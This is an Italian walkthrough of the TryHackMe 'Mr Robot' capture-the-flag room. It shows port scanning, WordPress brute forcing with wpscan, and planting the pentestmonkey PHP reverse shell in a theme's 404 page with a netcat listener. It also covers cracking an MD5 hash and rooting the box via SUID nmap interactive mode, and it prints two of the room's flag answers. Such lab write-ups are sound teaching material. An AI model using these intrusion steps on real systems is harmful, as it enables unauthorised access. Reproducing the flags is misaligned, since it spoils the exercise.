
https://tryhackme.com/room/mrrobot

Riesci a eseguire il rooting di questa macchina in stile Mr. Robot? Questa è una macchina virtuale pensata per utenti principianti/intermedi. Ci sono 3 chiavi nascoste sulla macchina, riesci a trovarle?

```
nmap -Pn -sS -vv -p- 10.10.170.89
```
```
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

```
nmap -sVC -p22,80,443 10.10.170.89
```
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:50:bc:4e:85:20:ff:63:8a:df:db:4a:83:8e:10:7a (RSA)
|   256 2d:ad:b4:a7:9b:b5:e1:ae:05:12:ac:c6:4b:05:34:b6 (ECDSA)
|_  256 1c:1f:9a:3a:9a:06:cb:62:84:d8:ba:2b:f2:f1:04:a4 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Diamo uno sguardo rapido agli indirizzi che abbiamo trovato
```
http://10.10.170.89/
```
sembra una pagina dove forse  possiamo immettere comandi se analizziamo il codice sorgente troviamo una scritta che dice "Non sei solo"

digitando help esce una lista di comandi che possiamo utilizzare li proviamo tutti per vedere di che si tratta
```
prepare
```
```
fsociety
```
```
inform
```
mentre leggo il contenuto degli scandali  ,mi viene in mente di controllare il sorgente e noto chiari riferimenti a wordpress http://10.10.170.89/wp-login.php e forse anche collegamenti ad altre reti , per il momento enumeriamo più avanti 
```
question
```
```
wakeup
```
```
join
```
alla fine ci chiede di immettere la nostra mail

guardiamo
```
https://10.10.170.89/
```
visualizziamo il certificato
```
www.example.com
```
lo aggiungiamo al file hosts
```
echo "10.10.170.89   www.example.com" > /etc/hosts
```

decido di fare un po' d'enumerazione

```
gobuster dir -u https://www.example.com -w /usr/share/wordlists/dirb/common.txt -t50 -k
```

```
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 218]
/.hta                 (Status: 403) [Size: 213]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> https://www.example.com/0/]
/admin                (Status: 301) [Size: 238] [--> https://www.example.com/admin/]
/audio                (Status: 301) [Size: 238] [--> https://www.example.com/audio/]
/atom                 (Status: 301) [Size: 0] [--> https://www.example.com/feed/atom/]
/blog                 (Status: 301) [Size: 237] [--> https://www.example.com/blog/]
/css                  (Status: 301) [Size: 236] [--> https://www.example.com/css/]
/dashboard            (Status: 302) [Size: 0] [--> https://www.example.com/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> https://www.example.com/feed/]
/images               (Status: 301) [Size: 239] [--> https://www.example.com/images/]
/index.html           (Status: 200) [Size: 1077]
/image                (Status: 301) [Size: 0] [--> https://www.example.com/image/]
/Image                (Status: 301) [Size: 0] [--> https://www.example.com/Image/]
/index.php            (Status: 301) [Size: 0] [--> https://www.example.com/]
/js                   (Status: 301) [Size: 235] [--> https://www.example.com/js/]
/intro                (Status: 200) [Size: 516314]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> https://www.example.com/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> https://www.example.com/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> https://www.example.com/feed/rdf/]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> https://www.example.com/feed/]
/rss2                 (Status: 301) [Size: 0] [--> https://www.example.com/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 238] [--> https://www.example.com/video/]
/wp-admin             (Status: 301) [Size: 241] [--> https://www.example.com/wp-admin/]
/wp-content           (Status: 301) [Size: 243] [--> https://www.example.com/wp-content/]
/wp-includes          (Status: 301) [Size: 244] [--> https://www.example.com/wp-includes/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2633]
/wp-settings          (Status: 500) [Size: 0]
/wp-signup            (Status: 302) [Size: 0] [--> https://www.example.com/wp-login.php?action=register]
/wp-mail              (Status: 500) [Size: 3064]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
```

Diamo uno sguardo al file robots.txt
```
https://www.example.com/robots.txt
```
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

```
https://www.example.com/key-1-of-3.txt
```
Troviamo la prima chiave
```
073403c8a58a1f80d943455fb30724b9
```
vediamo cosa c'è sull'altro file
```
https://www.example.com/fsocity.dic
```
è un file abbastanza lungo sembra un dizionario lo scarichiamo
```
wget http://www.example.com/fsocity.dic
```

su
```
https://www.example.com/0/
```
troviamo dei collegamenti a
```
https://www.example.com/wp-login.php
```

```
https://www.example.com/image/
```
	abbiamo un form dove postare commenti


```
https://www.example.com/feed/rdf/
```
troviamo uno script

- La parte `const o = JSON.parse(decodeURIComponent(escape(atob('...'))));` decodifica una stringa base64, la decodifica da URL e la converte in un oggetto JavaScript. Questo oggetto contiene informazioni come `userAgent`, `appVersion`, `platform`, ecc.
funzione generale: - **Raccolta Dati**: Il codice sembra progettato per raccogliere e gestire informazioni dettagliate sull'utente e sul browser, probabilmente per scopi di analisi o personalizzazione.

```
https://www.example.com/wp-login.php?registration=disabled
```

```
https://www.example.com/wp-login.php?action=lostpassword
```
	per il recupero della password

```
wpscan --url https://www.example.com/wp-login.php --disable-tls-checks
```
```
wpscan --url http://www.example.com/wp-login.php --enumerate p
```
```

[+] URL: http://www.example.com/wp-login.php/ [10.10.170.89]
[+] Started: Tue Sep 30 11:52:58 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Powered-By: PHP/5.5.29
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://www.example.com/wp-login.php/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] This site seems to be a multisite
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: http://codex.wordpress.org/Glossary#Multisite

[+] The external WP-Cron seems to be enabled: http://www.example.com/wp-login.php/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Query Parameter In Install Page (Aggressive Detection)
 |  - http://www.example.com/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://www.example.com/wp-includes/css/dashicons.min.css?ver=4.3.1
 | Confirmed By: Query Parameter In Upgrade Page (Aggressive Detection)
 |  - http://www.example.com/wp-includes/css/buttons.min.css?ver=4.3.1
 |  - http://www.example.com/wp-includes/css/dashicons.min.css?ver=4.3.1

[i] The main theme could not be detected.

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Sep 30 11:53:03 2025
[+] Requests Done: 45
[+] Cached Requests: 4
[+] Data Sent: 12.579 KB
[+] Data Received: 102.145 KB
[+] Memory used: 223.828 MB
[+] Elapsed time: 00:00:04
```

```
wpscan --url http://www.example.com/wp-login.php --passwords /usr/share/wordlists/metasploit/unix_passwords.txt --usernames admin
```
	tentativo di attacco alla password fallito

provo con il dizionario trovato precedentemente

```
wpscan --url http://www.example.com/wp-login.php --passwords fsocity.dic --usernames admin
```
la cosa si fa abbastanza lunga..... bisogna trovare un user valido

Dopo tanto girare trovo qualcosa in
```
https://www.example.com/license
```
```
what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
do you want a password or something?
ZWxsaW90OkVSMjgtMDY1Mgo=
```
sembra un base64  proviamo la decodifica
```
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 --decode
```
```
elliot:ER28-0652
```
sembra un user e password

proviamo a loggarci e vediamo un po'

```
https://www.example.com/wp-admin/
```
Siamo dentro!

Come abbiamo visto con wpscan WordPress version 4.3.1 presenta delle vulnerabilità

Possiamo creare una connessione shell remota inserendo del codice PHP nelle impostazioni dell'editor del tema per 404.php

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Quindi andiamo su Edit Themes e procediamo
https://www.example.com/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen

Incolliamo il php di reverse shell modificando con il nostro IP e porta

clicchiamo su Upload File

ora mettiamoci in ascolto su kali

```
nc -lvnp 1234
```

ora andiamo su una pagina inesistente
```
https://www.example.com/wp-admin/123.php
```

ed otteniamo la nostra revshell che andremo a stabilizzare

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
┌──(root㉿kali)-[/home/kali/Downloads/Laboratori]
└─# nc -lvnp 1234                      
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.170.89] 47984
Linux ip-10-10-170-89 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 16:50:09 up  2:09,  0 users,  load average: 0.00, 0.02, 0.17
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@ip-10-10-170-89:/$ whoami
whoami
daemon

```
ora navighiamo tra le cartelle
```
cd home
daemon@ip-10-10-170-89:/home$ ls
ls
robot  ubuntu
daemon@ip-10-10-170-89:/home$ cd robot
cd robot
daemon@ip-10-10-170-89:/home/robot$ ls -al
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@ip-10-10-170-89:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@ip-10-10-170-89:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@ip-10-10-170-89:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@ip-10-10-170-89:/home/robot$
```

non possiamo leggere il file key-2-of-3.txt
ma abbiamo ottenuto forse la password di robot nel file password.raw-md5

```
su robot
```
```
c3fcd3d76192e4007dfb496cca67e13b
```
sembra non funzionare vediamo se la password è codificata su 
https://crackstation.net/
è un hash che corrisponde a 
```
abcdefghijklmnopqrstuvwxyz
```
riproviamo
```
su robot
```
```
abcdefghijklmnopqrstuvwxyz
```

```
su robot
Password: abcdefghijklmnopqrstuvwxyz

$ whoami
whoami
robot
$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
robot@ip-10-10-170-89:~$ 

```
ora leggiamo il file key-2-of-3.txt
```
cat key-2-of-3.txt
```
```
ls -al
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
robot@ip-10-10-170-89:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
robot@ip-10-10-170-89:~$ 
```
ecco la seconda chiave
```
822c73956184f694993bede3eb39f959
```

Ora a caccia della terza chiave che sicuramente la otterremo con la scalata dei privilegi

```
sudo -l
```
```
Sorry, user robot may not run sudo on ip-10-10-170-89.
robot@ip-10-10-170-89:~$ 
```

proviamo con la ricerca di binari con permessi suid
```
find / -perm -u=s -type f 2>/dev/null
```

```
find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
robot@ip-10-10-170-89:~$ 

```

abbiamo trovato un binario interessante nmap

https://gtfobins.github.io/gtfobins/nmap/#sudo

```
nmap -interactive
```

```
!sh
```

```
robot@ip-10-10-170-89:~$ nmap -interactive
nmap -interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
root@ip-10-10-170-89:~# 
```
Siamo root ora recuperiamo la terza chiave
```
root@ip-10-10-170-89:/# cd root
cd root
root@ip-10-10-170-89:/root# ls -al
ls -al
total 44
drwx------  7 root root 4096 Jun  2 18:26 .
drwxr-xr-x 23 root root 4096 Sep 30 14:41 ..
-rw-------  1 root root    0 Jun  2 18:26 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  3 root root 4096 May 29 15:36 .cache
drwx------  3 root root 4096 May 29 15:36 .config
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
drwx------  3 root root 4096 May 29 16:58 .gnupg
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
drwxr-xr-x  3 root root 4096 May 29 17:26 .local
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
drwx------  2 root root 4096 May 29 15:20 .ssh
-rw-------  1 root root    0 Jun  2 18:26 .viminfo
root@ip-10-10-170-89:/root# cat key-3-of-3.txt
cat key-3-of-3.txt
xxxxxxxxxxxxxxxxxxxxxx
root@ip-10-10-170-89:/root# 

```
Qual è la chiave 3?
```
xxxxxxxxxxxxxxxx
```

